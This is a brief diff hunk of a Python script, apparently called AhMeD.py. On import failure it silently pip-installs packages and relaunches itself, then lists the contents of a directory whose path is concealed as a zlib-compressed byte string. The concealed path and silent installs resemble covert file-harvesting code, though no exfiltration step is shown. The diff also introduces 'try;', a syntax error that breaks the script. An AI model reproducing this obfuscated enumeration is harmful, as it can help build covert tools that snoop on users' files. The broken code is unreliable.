@@ -18,7 +18,7 @@ except ImportError:
     os.system('pip install requests futures==2 > /dev/null')
     os.system('python AhMeD.py')
 
-try:
+try;
     g = "anar"
     f="tt"
     file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
